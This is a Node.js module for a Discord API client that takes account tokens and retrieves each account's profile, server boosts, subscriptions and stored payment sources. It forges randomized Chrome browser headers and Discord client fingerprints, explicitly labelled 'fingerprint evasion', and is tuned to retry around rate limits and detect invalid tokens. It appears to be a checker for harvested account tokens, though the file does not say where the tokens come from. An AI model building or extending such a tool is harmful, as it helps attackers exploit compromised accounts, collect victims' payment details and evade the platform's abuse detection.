/**
 * Secure API client module - Speed Optimized
 * Enhanced Discord API client with advanced security measures and performance optimization
 * Features: Dynamic headers, request optimization, fingerprint evasion, fast processing
 */

const axios = require("axios");
const { CONFIG, API_ENDPOINTS } = require("./config");

class SecureApiClient {
    constructor() {
        this.requestCount = 0;
        this.lastRequestTime = 0;
        this.sessionId = this.generateSessionId();
        this.fingerprintCache = new Map();
        
        this.client = axios.create({
            timeout: CONFIG.timeout + Math.floor(Math.random() * 5000),
            headers: this.generateBaseHeaders()
        });

        this.client.interceptors.response.use(
            response => response,
            error => {
                if (error.response) {
                    error.isApiError = true;
                    error.statusCode = error.response.status;
                    error.apiData = error.response.data;
                }
                return Promise.reject(error);
            }
        );

        this.client.interceptors.request.use(
            async config => {
                if (CONFIG.fastMode) {
                    await this.enforceMinimumDelayFast();
                } else {
                    await this.enforceMinimumDelay();
                }
                
                config.headers = {
                    ...config.headers,
                    ...this.generateDynamicHeaders()
                };
                
                if (!CONFIG.fastMode && Math.random() > 0.7) {
                    config.headers["X-RateLimit-Precision"] = "millisecond";
                }
                
                return config;
            },
            error => Promise.reject(error)
        );
    }

    generateSessionId() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let result = '';
        for (let i = 0; i < 32; i++) {
            result += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        return result;
    }

    generateBaseHeaders() {
        const chromeVersions = ['120.0.0.0', '119.0.0.0', '121.0.0.0', '118.0.0.0', '117.0.0.0'];
        const chromeVersion = chromeVersions[Math.floor(Math.random() * chromeVersions.length)];
        const windowsVersions = ['10.0', '11.0'];
        const windowsVersion = windowsVersions[Math.floor(Math.random() * windowsVersions.length)];
        
        return {
            "User-Agent": `Mozilla/5.0 (Windows NT ${windowsVersion}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVersion} Safari/537.36`,
            "Accept": "*/*",
            "Accept-Language": this.getRandomLanguage(),
            "Accept-Encoding": "gzip, deflate, br",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-Ch-Ua": `"Not_A Brand";v="8", "Chromium";v="${chromeVersion.split('.')[0]}", "Google Chrome";v="${chromeVersion.split('.')[0]}"`,
            "Sec-Ch-Ua-Mobile": "?0",
            "Sec-Ch-Ua-Platform": '"Windows"',
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "DNT": "1"
        };
    }

    getRandomLanguage() {
        const languages = [
            "en-US,en;q=0.9",
            "en-US,en;q=0.9,es;q=0.8",
            "en-US,en;q=0.9,fr;q=0.8",
            "en-GB,en-US;q=0.9,en;q=0.8"
        ];
        return languages[Math.floor(Math.random() * languages.length)];
    }

    generateDynamicHeaders() {
        this.requestCount++;
        const buildNumbers = [267009, 267010, 267011, 266999, 267008, 267012, 267013];
        const buildNumber = buildNumbers[Math.floor(Math.random() * buildNumbers.length)];
        const userAgent = this.generateBaseHeaders()["User-Agent"];
        
        const superProperties = {
            os: "Windows",
            browser: "Chrome",
            device: "",
            system_locale: "en-US",
            browser_user_agent: userAgent,
            browser_version: userAgent.match(/Chrome\/([\d.]+)/)[1],
            os_version: Math.random() > 0.5 ? "10" : "11",
            referrer: this.getRandomReferrer(),
            referring_domain: this.getRandomReferringDomain(),
            referrer_current: "",
            referring_domain_current: "",
            release_channel: "stable",
            client_build_number: buildNumber,
            client_event_source: null,
            design_id: Math.floor(Math.random() * 10),
            client_performance_cpu: Math.floor(Math.random() * 8) + 1,
            client_performance_memory: Math.floor(Math.random() * 16) + 4
        };

        if (Math.random() > 0.6) {
            superProperties.theme = Math.random() > 0.5 ? "dark" : "light";
        }
        
        if (Math.random() > 0.7) {
            superProperties.accessibility_support_enabled = Math.random() > 0.8;
        }

        return {
            "X-Super-Properties": Buffer.from(JSON.stringify(superProperties)).toString("base64"),
            "X-Debug-Options": "bugReporterEnabled",
            "X-Discord-Locale": "en-US",
            "X-Discord-Timezone": this.getRandomTimezone(),
            "Origin": "https://discord.com",
            "Referer": "https://discord.com/channels/@me"
        };
    }

    getRandomReferrer() {
        const referrers = [
            "https://discord.com/channels/@me",
            "https://discord.com/login",
            "https://discord.com/",
            ""
        ];
        return referrers[Math.floor(Math.random() * referrers.length)];
    }

    getRandomReferringDomain() {
        const domains = [
            "discord.com",
            "",
            "google.com"
        ];
        return domains[Math.floor(Math.random() * domains.length)];
    }

    getRandomTimezone() {
        const timezones = [
            "America/New_York",
            "America/Los_Angeles", 
            "America/Chicago",
            "Europe/London",
            "Europe/Berlin"
        ];
        return timezones[Math.floor(Math.random() * timezones.length)];
    }

    async enforceMinimumDelay() {
        const now = Date.now();
        const timeSinceLastRequest = now - this.lastRequestTime;
        const minimumDelay = CONFIG.requestDelay + Math.floor(Math.random() * CONFIG.jitterRange[1]);
        
        if (timeSinceLastRequest < minimumDelay) {
            const delayNeeded = minimumDelay - timeSinceLastRequest;
            await this.sleep(delayNeeded);
        }
        
        this.lastRequestTime = Date.now();
    }

    async enforceMinimumDelayFast() {
        const now = Date.now();
        const timeSinceLastRequest = now - this.lastRequestTime;
        const minimumDelay = CONFIG.minDelayBetweenRequests;
        
        if (timeSinceLastRequest < minimumDelay) {
            const delayNeeded = minimumDelay - timeSinceLastRequest;
            await this.sleep(delayNeeded);
        }
        
        this.lastRequestTime = Date.now();
    }

    async makeRequest(endpoint, token, retries = CONFIG.retryLimit) {
        let attempts = 0;
        
        while (attempts < retries) {
            try {
                if (attempts > 0) {
                    const jitter = CONFIG.fastMode ? 
                        Math.floor(Math.random() * 500) + 200 : 
                        Math.floor(Math.random() * 2000) + 1000;
                    await this.sleep(jitter);
                }

                const response = await this.client.get(endpoint, {
                    headers: { 
                        Authorization: token,
                        "X-Request-ID": this.generateRequestId()
                    }
                });
                
                return response.data;
            } catch (error) {
                attempts++;
                
                if (error.isApiError) {
                    if (error.statusCode === 429) {
                        const retryAfter = (error.apiData?.retry_after || 5) * 1000;
                        const jitter = CONFIG.fastMode ? 
                            Math.floor(Math.random() * 500) : 
                            Math.floor(Math.random() * 2000);
                        await this.sleep(retryAfter + jitter);
                        continue;
                    }
                    
                    if (error.statusCode === 401 || error.statusCode === 403) {
                        throw new Error(`INVALID_TOKEN:${error.statusCode}`);
                    }

                    if (error.statusCode >= 500) {
                        if (attempts < retries) {
                            const backoff = CONFIG.fastMode ? 
                                Math.pow(1.5, attempts) * 500 + Math.floor(Math.random() * 300) :
                                Math.pow(2, attempts) * 1000 + Math.floor(Math.random() * 1000);
                            await this.sleep(backoff);
                            continue;
                        }
                    }
                }
                
                if (attempts >= retries) {
                    throw error;
                }
                
                const backoff = CONFIG.fastMode ?
                    Math.pow(1.5, attempts) * CONFIG.requestDelay + Math.floor(Math.random() * 300) :
                    Math.pow(2, attempts) * CONFIG.requestDelay + Math.floor(Math.random() * 1000);
                await this.sleep(backoff);
            }
        }
    }

    generateRequestId() {
        return Date.now().toString(36) + Math.random().toString(36).substr(2);
    }

    async getUserInfo(token) {
        return await this.makeRequest(API_ENDPOINTS.USER_INFO, token);
    }

    async getUserProfile(token, userId) {
        try {
            return await this.makeRequest(API_ENDPOINTS.USER_PROFILE(userId), token);
        } catch (error) {

            return { user: { public_flags_ext: 0 }, badges: [] };
        }
    }

    async getGuildBoosts(token) {
        try {
            return await this.makeRequest(API_ENDPOINTS.GUILD_BOOSTS, token);
        } catch (error) {
            return [];
        }
    }

    async getSubscriptions(token) {
        try {
            return await this.makeRequest(API_ENDPOINTS.SUBSCRIPTIONS, token);
        } catch (error) {
            return [];
        }
    }

    async getPaymentSources(token) {
        try {
            return await this.makeRequest(API_ENDPOINTS.PAYMENT_SOURCES, token);
        } catch (error) {
            return [];
        }
    }

    async getAllUserData(token) {
        const user = await this.getUserInfo(token);
        
        if (CONFIG.fastMode && CONFIG.parallelRequests) {
            const [profileData, guildBoosts, subscriptions, paymentSources] = await Promise.allSettled([
                this.getUserProfile(token, user.id),
                this.getGuildBoosts(token),
                this.getSubscriptions(token),
                this.getPaymentSources(token)
            ]);

            return {
                user,
                profile: profileData.status === 'fulfilled' ? profileData.value : { user: { public_flags_ext: 0 }, badges: [] },
                boosts: guildBoosts.status === 'fulfilled' ? guildBoosts.value : [],
                subscriptions: subscriptions.status === 'fulfilled' ? subscriptions.value : [],
                payments: paymentSources.status === 'fulfilled' ? paymentSources.value : []
            };
        } else {
            const delays = [100, 150, 200, 250].map(d => d + Math.floor(Math.random() * 100));
            
            const [profileData, guildBoosts, subscriptions, paymentSources] = await Promise.allSettled([
                this.sleep(delays[0]).then(() => this.getUserProfile(token, user.id)),
                this.sleep(delays[1]).then(() => this.getGuildBoosts(token)),
                this.sleep(delays[2]).then(() => this.getSubscriptions(token)),
                this.sleep(delays[3]).then(() => this.getPaymentSources(token))
            ]);

            return {
                user,
                profile: profileData.status === 'fulfilled' ? profileData.value : { user: { public_flags_ext: 0 }, badges: [] },
                boosts: guildBoosts.status === 'fulfilled' ? guildBoosts.value : [],
                subscriptions: subscriptions.status === 'fulfilled' ? subscriptions.value : [],
                payments: paymentSources.status === 'fulfilled' ? paymentSources.value : []
            };
        }
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    clearFingerprintCache() {
        this.fingerprintCache.clear();
    }

    getSecurityStatus() {
        return {
            requestCount: this.requestCount,
            sessionId: this.sessionId,
            fingerprintCacheSize: this.fingerprintCache.size,
            lastRequestTime: this.lastRequestTime,
            fastMode: CONFIG.fastMode,
            parallelRequests: CONFIG.parallelRequests
        };
    }
}

module.exports = SecureApiClient;
